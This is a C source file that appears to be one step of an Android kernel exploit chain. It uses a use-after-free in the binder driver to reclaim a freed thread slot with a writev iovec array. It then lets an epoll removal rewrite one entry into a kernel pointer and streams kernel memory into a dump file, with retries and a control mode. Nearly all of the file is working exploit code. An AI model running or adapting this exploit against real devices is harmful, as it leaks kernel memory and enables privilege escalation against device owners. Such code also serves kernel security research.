/* wread2.c — task #7 step 2: turn clobber's shape from WRITE to READ.
 *
 * clobber.c (proven) : readv blocks on an empty pipe, the kernel's own
 *   remove_wait_queue (epoll DEL) writes list pointers INTO the freed
 *   binder_thread slot that the readv imported as its iovec copy, entry[5]
 *   gets a kernel pointer as iov_base, and the child feeds 48 bytes that the
 *   iterator then writes through that pointer -- arbitrary WRITE.
 *
 * wread2 (this file): same dance, but the blocked syscall is a WRITEV.
 *   iov_base is the SOURCE for writev, so the same pollution makes writev
 *   read FROM kernel memory into the pipe -- arbitrary READ, with no kernel
 *   write anywhere: epoll_ctl(EPOLL_CTL_DEL) is an ordinary syscall, the
 *   list-pointer write into the freed slot is done by the kernel itself.
 *
 * Roles:
 *   parent : setup, then reads the pipe into a dump file (the reader);
 *   writer : 18-entry writev, blocked on the full pipe (entries 0..4 fill
 *            the one-page pipe; the polluted entry[5] is consumed only after
 *            the parent starts draining);
 *   poller : sleeps, then epoll_ctl(DEL) -- the kernel-side write that
 *            reprograms entry[5].iov_base into a kernel pointer.
 *
 * Verdicts:
 *   - NO-DEL control run: the drained stream is ALL user markers (0x40..);
 *   - DEL run: markers for entries >=5 go MISSING and kernel-looking data
 *     appears instead (kernel VA density / the 0x10001 spinlock shape) --
 *     that is the read channel working.
 * Everything is in-memory state; adb reboot restores it all.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <sched.h>

#define PAGE            0x1000ul
#define UAF_SPINLOCK    0x10001ul
#define BINDER_THREAD_SZ 0x128
#define IOVEC_ARRAY_SZ  (BINDER_THREAD_SZ / 16)   /* 18 */
#define WQIDX           (0x50 / 16)               /* entry holding task_list.next */
#define BINDER_THREAD_EXIT 0x40046208u
#define BINDER_SET_MAX_THREADS _IOW('c', 5, uint32_t)
#define DELAY_USEC 200000
#define ARMED "/data/local/tmp/wread2.armed"
#define DONE  "/data/local/tmp/wread2.done"

typedef uint64_t binder_size_t;
typedef uint64_t binder_uintptr_t;
struct binder_transaction_data {
    union { uint32_t handle; binder_uintptr_t ptr; } target;
    binder_uintptr_t cookie;
    uint32_t code;
    uint32_t flags;
    int32_t  sender_pid;
    uint32_t sender_euid;
    binder_size_t data_size;
    binder_size_t offsets_size;
    union { struct { binder_uintptr_t buffer; binder_uintptr_t offsets; } ptr; uint8_t buf[8]; } data;
};
struct binder_write_read {
    binder_size_t write_size, write_consumed, write_buffer;
    binder_size_t read_size, read_consumed, read_buffer;
};
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_TRANSACTION    _IOW('c', 0, struct binder_transaction_data)

static int binder_fd = -1, epfd = -1;
static struct epoll_event g_ev = { .events = EPOLLIN };

static void pin0(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(0, &s);
    sched_setaffinity(0, sizeof s, &s);
}

/* identical to clobber.c: leave transaction_stack set / todo empty /
 * return_error BR_OK with BR_TRANSACTION_COMPLETE drained but no reply --
 * the only state where binder_poll() registers poll_wait(&thread->wait). */
static int arm_pending_tx(int fd)
{
    char wbuf[4 + sizeof(struct binder_transaction_data)];
    char payload[16];
    struct binder_transaction_data tr;
    struct binder_write_read bwr;
    uint32_t cmd = BC_TRANSACTION;
    int rc, attempt_no;

    memset(payload, 0, sizeof payload);
    memset(&tr, 0, sizeof tr);
    tr.target.handle = 0;
    tr.code = 2;
    tr.flags = 0;
    tr.data_size = sizeof payload;
    tr.data.ptr.buffer = (binder_uintptr_t)(uintptr_t)payload;
    memcpy(wbuf, &cmd, 4);
    memcpy(wbuf + 4, &tr, sizeof tr);
    memset(&bwr, 0, sizeof bwr);
    bwr.write_size = sizeof wbuf;
    bwr.write_buffer = (uint64_t)(uintptr_t)wbuf;
    errno = 0;
    rc = ioctl(fd, BINDER_WRITE_READ, &bwr);
    if (rc) { printf("  arm: rc=%d errno=%d\n", rc, errno); return rc; }

    for (attempt_no = 0; attempt_no < 3; attempt_no++) {
        char rbuf[256];
        struct binder_write_read bwr2;
        size_t off = 0;
        int got_complete = 0, got_reply = 0;
        memset(rbuf, 0, sizeof rbuf);
        memset(&bwr2, 0, sizeof bwr2);
        bwr2.read_size = sizeof rbuf;
        bwr2.read_buffer = (uint64_t)(uintptr_t)rbuf;
        rc = ioctl(fd, BINDER_WRITE_READ, &bwr2);
        if (rc)
            return rc;
        while (off + 4 <= (size_t)bwr2.read_consumed) {
            uint32_t c;
            memcpy(&c, rbuf + off, 4);
            off += 4;
            if (c == 0x7206)
                got_complete = 1;
            else if (c == 0x80407203 || c == 0x80407202) { got_reply = 1; off += 64; }
        }
        if (got_complete && !got_reply)
            return 0;
        if (got_reply) {
            printf("  drain %d: reply already eaten\n", attempt_no);
            return -1;
        }
    }
    return -1;
}

static unsigned char mark(int entry) { return (unsigned char)(0x40 + entry); }

static int is_kern_va(const unsigned char *p)
{
    unsigned long long v;
    memcpy(&v, p, 8);
    return v >= 0xffffff8000000000ULL && v < 0xffffffd000000000ULL;
}

#define NENT   18
#define SMALL  1024                /* entries 0..4: fill the one-page pipe  */
#define TAIL   512                 /* entries 5..17: user markers (control) */

/* attempt: one full arm -> exit -> import -> poll -> drain cycle.
 * Returns 0 when the read channel fired (kernel data in the dump). */
/* attempt: arm -> EXIT -> writev (imports the freed slot, blocks) ->
 * poller DELs (the kernel's own list_del reprograms entry[5].iov_base into a
 * kernel pointer) -> poller drains the pipe: the writev iterator then reads
 * FROM kernel memory into the pipe, and the poller saves it as the dump.
 * No kernel write is issued by us anywhere. */
static int attempt_run(int nodel)
{
    int pfd[2], i, rc = 1;
    long seen[NENT];
    struct iovec iov[NENT];
    unsigned char *blk[NENT];
    pid_t wpid;
    int wst = 0;
    unsigned char *dump = NULL;
    long dump_len = 0, dump_cap = 0, got;
    size_t kva = 0;
    const char *outpath = "/data/local/tmp/wread2.dump";

    if (pipe(pfd) < 0) { perror("pipe"); return 1; }
    if (fcntl(pfd[1], F_SETPIPE_SZ, PAGE) != (int)PAGE) {
        printf("  F_SETPIPE_SZ(1 page) failed errno=%d\n", errno);
        return 1;
    }
    for (i = 0; i < NENT; i++) {
        size_t len = (i < 5) ? SMALL : TAIL;
        blk[i] = malloc(len);
        if (!blk[i]) return 1;
        memset(blk[i], mark(i), len);
        iov[i].iov_base = blk[i];
        iov[i].iov_len = len;
    }

    binder_fd = open("/dev/binder", O_RDWR | O_NONBLOCK);
    if (binder_fd < 0) { printf("  open binder errno=%d\n", errno); return 1; }
    {
        void *map = mmap(NULL, 1 << 20, PROT_READ, MAP_SHARED, binder_fd, 0);
        if (map == MAP_FAILED)
            printf("  mmap binder: %s\n", strerror(errno));
    }
    {
        int mt = 3;
        ioctl(binder_fd, BINDER_SET_MAX_THREADS, &mt);
    }
    epfd = epoll_create(1000);
    if (arm_pending_tx(binder_fd) != 0) {
        printf("  arm failed\n");
        return 1;
    }
    /* THE ADD makes binder_poll() hang the eppoll_entry on thread->wait */
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &g_ev))
        printf("  epoll_add errno=%d\n", errno);

    /* poller forked BEFORE the EXIT: no fork allocations can steal the freed
     * slot between EXIT and the writev's import (which happens immediately
     * after, in the parent).  The poller sleeps 500 ms (the import is done
     * within microseconds of the EXIT), then DELs into the live iovec copy,
     * then drains the pipe into the dump file. */
    wpid = fork();
    if (wpid == 0) {
        close(pfd[1]);
        usleep(500000);
        if (nodel)
            printf("  poller: nodel control\n");
        else if (epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &g_ev))
            printf("  poller: DEL errno=%d\n", errno);
        else
            printf("  poller: DEL landed\n");
        fflush(stdout);
        /* drain: the writer's iterator is parked on the polluted entry[5];
         * reading the pipe gives it room to stream kernel memory out */
        {
            FILE *out = fopen(outpath, "wb");
            char buf[4096];
            long total = 0;
            int n;
            while ((n = (int)read(pfd[0], buf, sizeof buf)) > 0) {
                total += n;
                if (out)
                    fwrite(buf, 1, (size_t)n, out);
            }
            if (out)
                fclose(out);
            printf("  poller: drained %ld bytes\n", total);
        }
        fflush(stdout);
        close(pfd[0]);
        _exit(0);
    }

    /* the UAF: free the thread slot */
    {
        int b = ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        if (b)
            printf("  BINDER_THREAD_EXIT rc=%d errno=%d\n", b, errno);
    }
    /* the writev reclaims the freed slot immediately (LIFO), fills the pipe
     * with entries 0..4 and blocks; after the poller's DEL its entry[5]
     * carries a kernel pointer, so the drain streams kernel memory */
    {
        ssize_t wv = writev(pfd[1], iov, NENT);
        printf("  writev returned %zd errno=%d\n", wv, wv < 0 ? errno : 0);
    }
    close(pfd[1]);
    waitpid(wpid, &wst, 0);
    printf("  poller exit status: %d\n", WEXITSTATUS(wst));

    /* read the dump back and judge */
    {
        FILE *f = fopen(outpath, "rb");
        if (!f) { printf("  no dump\n"); return 1; }
        fseek(f, 0, SEEK_END);
        dump_len = ftell(f);
        fseek(f, 0, SEEK_SET);
        dump = malloc(dump_len ? (size_t)dump_len : 1);
        if (fread(dump, 1, (size_t)dump_len, f) != (size_t)dump_len)
            printf("  dump readback short\n");
        fclose(f);
    }
    for (i = 0; i < NENT; i++)
        seen[i] = 0;
    for (long q = 0; q + 8 <= dump_len; q += 8)
        if (is_kern_va(dump + q))
            kva++;
    for (long q = 0; q < dump_len; q++)
        for (i = 0; i < NENT; i++)
            if (dump[q] == mark(i)) { seen[i]++; break; }
    for (i = 0; i < NENT; i++)
        printf("  e[%02d] 0x%02x: %ld\n", i, mark(i), seen[i]);
    printf("  kernel-VA qwords: %zu\n", kva);

    if (!nodel) {
        int post_gone = seen[5] == 0 && seen[6] == 0 && seen[7] == 0;
        if (kva > 8 && post_gone) {
            printf("== READ CHANNEL UP: writev streamed kernel memory after "
                   "the DEL reprogrammed entry[5] ==\n");
            rc = 0;
        } else if (!post_gone) {
            printf("== miss: user markers survived (slot mismatch/timing) ==\n");
        } else {
            printf("== DEL reached the copy but no kernel data streamed ==\n");
        }
    } else {
        printf("== control run (nodel): kva=%zu e5=%ld ==\n", kva, seen[5]);
        rc = 1;   /* control runs never "pass" */
    }
    free(dump);
    for (i = 0; i < NENT; i++)
        free(blk[i]);
    close(binder_fd);
    close(epfd);
    return rc;
}

int main(int argc, char **argv)
{
    int t, rc = 1, nodel = (argc > 1 && !strcmp(argv[1], "nodel"));

    for (t = 0; t < 12; t++) {
        printf("=== attempt %d ===\n", t);
        rc = attempt_run(nodel);
        if (rc == 0)
            break;
        sleep(1);
    }
    return rc;
}
